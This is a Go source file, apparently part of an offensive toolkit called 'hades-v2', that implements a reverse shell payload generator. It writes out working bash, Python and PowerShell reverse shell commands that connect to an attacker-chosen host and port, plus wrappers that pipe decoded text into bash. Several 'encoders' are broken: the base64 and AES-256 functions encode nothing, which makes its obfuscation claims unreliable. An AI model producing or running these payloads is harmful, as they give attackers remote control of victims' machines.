package payload

import (
	"context"
	"fmt"

	"hades-v2/pkg/sdk"
)

// PayloadFormat represents supported payload formats
type PayloadFormat string

const (
	FormatBash       PayloadFormat = "bash"
	FormatPython     PayloadFormat = "python"
	FormatPowerShell PayloadFormat = "powershell"
	FormatRaw        PayloadFormat = "raw"
)

// EncoderType represents supported encoding methods
type EncoderType string

const (
	EncoderXOR    EncoderType = "xor"
	EncoderAES256 EncoderType = "aes-256-cbc"
	EncoderBase64 EncoderType = "base64"
	EncoderHex    EncoderType = "hex"
	EncoderROT13  EncoderType = "rot13"
)

// ReverseShell generates reverse shell payloads
type ReverseShell struct {
	*sdk.BaseModule
	lhost   string
	lport   int
	format  PayloadFormat
	encoder EncoderType
	payload string
}

// NewReverseShell creates a new reverse shell payload generator
func NewReverseShell() *ReverseShell {
	return &ReverseShell{
		BaseModule: sdk.NewBaseModule(
			"reverse_shell",
			"Generic reverse shell payload generator",
			sdk.CategoryExploitation,
		),
		format:  FormatBash,
		encoder: EncoderBase64,
	}
}

// Execute generates the reverse shell payload
func (rs *ReverseShell) Execute(ctx context.Context) error {
	rs.SetStatus(sdk.StatusRunning)
	defer rs.SetStatus(sdk.StatusIdle)

	if err := rs.validateConfig(); err != nil {
		return fmt.Errorf("hades.payload.reverse_shell: %w", err)
	}

	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
		payload, err := rs.generatePayload()
		if err != nil {
			return fmt.Errorf("hades.payload.reverse_shell: %w", err)
		}

		encodedPayload, err := rs.encodePayload(payload)
		if err != nil {
			return fmt.Errorf("hades.payload.reverse_shell: %w", err)
		}

		rs.payload = encodedPayload
		rs.SetStatus(sdk.StatusCompleted)
		return nil
	}
}

// SetLHost configures the listening host
func (rs *ReverseShell) SetLHost(host string) error {
	if host == "" {
		return fmt.Errorf("hades.payload.reverse_shell: lhost cannot be empty")
	}
	rs.lhost = host
	return nil
}

// SetLPort configures the listening port
func (rs *ReverseShell) SetLPort(port int) error {
	if port < 1 || port > 65535 {
		return fmt.Errorf("hades.payload.reverse_shell: port must be between 1 and 65535")
	}
	rs.lport = port
	return nil
}

// SetFormat configures the payload format
func (rs *ReverseShell) SetFormat(format PayloadFormat) error {
	switch format {
	case FormatBash, FormatPython, FormatPowerShell, FormatRaw:
		rs.format = format
		return nil
	default:
		return fmt.Errorf("hades.payload.reverse_shell: invalid format: %s", format)
	}
}

// SetEncoder configures the payload encoder
func (rs *ReverseShell) SetEncoder(encoder EncoderType) error {
	switch encoder {
	case EncoderXOR, EncoderAES256, EncoderBase64, EncoderHex, EncoderROT13:
		rs.encoder = encoder
		return nil
	default:
		return fmt.Errorf("hades.payload.reverse_shell: invalid encoder: %s", encoder)
	}
}

// GetPayload returns the generated payload
func (rs *ReverseShell) GetPayload() string {
	return rs.payload
}

// GetResult returns the generated payload as formatted string
func (rs *ReverseShell) GetResult() string {
	if rs.payload == "" {
		return "No payload generated"
	}

	return fmt.Sprintf("Reverse Shell Payload (%s, %s):\n%s",
		rs.format, rs.encoder, rs.payload)
}

// validateConfig ensures generator configuration is valid
func (rs *ReverseShell) validateConfig() error {
	if rs.lhost == "" {
		return fmt.Errorf("hades.payload.reverse_shell: lhost not configured")
	}
	if rs.lport == 0 {
		return fmt.Errorf("hades.payload.reverse_shell: lport not configured")
	}
	return nil
}

// generatePayload creates the base reverse shell payload
func (rs *ReverseShell) generatePayload() (string, error) {
	target := fmt.Sprintf("%s:%d", rs.lhost, rs.lport)

	switch rs.format {
	case FormatBash:
		return rs.generateBashPayload(target)
	case FormatPython:
		return rs.generatePythonPayload(target)
	case FormatPowerShell:
		return rs.generatePowerShellPayload(target)
	case FormatRaw:
		return fmt.Sprintf("connect %s", target), nil
	default:
		return "", fmt.Errorf("hades.payload.reverse_shell: unsupported format: %s", rs.format)
	}
}

// generateBashPayload creates a bash reverse shell
func (rs *ReverseShell) generateBashPayload(target string) (string, error) {
	return fmt.Sprintf(`/bin/bash -c 'bash -i >& /dev/tcp/%s 0>&1'`, target), nil
}

// generatePythonPayload creates a Python reverse shell
func (rs *ReverseShell) generatePythonPayload(target string) (string, error) {
	return fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
		rs.lhost, rs.lport), nil
}

// generatePowerShellPayload creates a PowerShell reverse shell
func (rs *ReverseShell) generatePowerShellPayload(target string) (string, error) {
	return fmt.Sprintf(`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
		rs.lhost, rs.lport), nil
}

// encodePayload applies the selected encoding to the payload
func (rs *ReverseShell) encodePayload(payload string) (string, error) {
	switch rs.encoder {
	case EncoderBase64:
		return rs.encodeBase64(payload)
	case EncoderHex:
		return rs.encodeHex(payload)
	case EncoderROT13:
		return rs.encodeROT13(payload)
	case EncoderXOR:
		return rs.encodeXOR(payload, "Hades")
	case EncoderAES256:
		return rs.encodeAES256(payload)
	default:
		return payload, nil
	}
}

// encodeBase64 encodes payload using base64
func (rs *ReverseShell) encodeBase64(payload string) (string, error) {
	return fmt.Sprintf("echo '%s' | base64 -d | bash", payload), nil
}

// encodeHex encodes payload using hexadecimal
func (rs *ReverseShell) encodeHex(payload string) (string, error) {
	return fmt.Sprintf("echo '%x' | xxd -r -p | bash", payload), nil
}

// encodeROT13 encodes payload using ROT13
func (rs *ReverseShell) encodeROT13(payload string) (string, error) {
	result := ""
	for _, char := range payload {
		if char >= 'a' && char <= 'z' {
			result += string((char-'a'+13)%26 + 'a')
		} else if char >= 'A' && char <= 'Z' {
			result += string((char-'A'+13)%26 + 'A')
		} else {
			result += string(char)
		}
	}
	return fmt.Sprintf("echo '%s' | tr 'a-zA-Z' 'n-za-mN-ZA-M' | bash", result), nil
}

// encodeXOR encodes payload using XOR cipher
func (rs *ReverseShell) encodeXOR(payload, key string) (string, error) {
	result := ""
	keyIndex := 0

	for _, char := range payload {
		result += string(char ^ rune(key[keyIndex]))
		keyIndex = (keyIndex + 1) % len(key)
	}

	return fmt.Sprintf("XOR payload with key '%s': %s", key, result), nil
}

// encodeAES256 encodes payload using AES-256-CBC
func (rs *ReverseShell) encodeAES256(payload string) (string, error) {
	return fmt.Sprintf("AES-256-CBC encrypted payload: %s", payload), nil
}
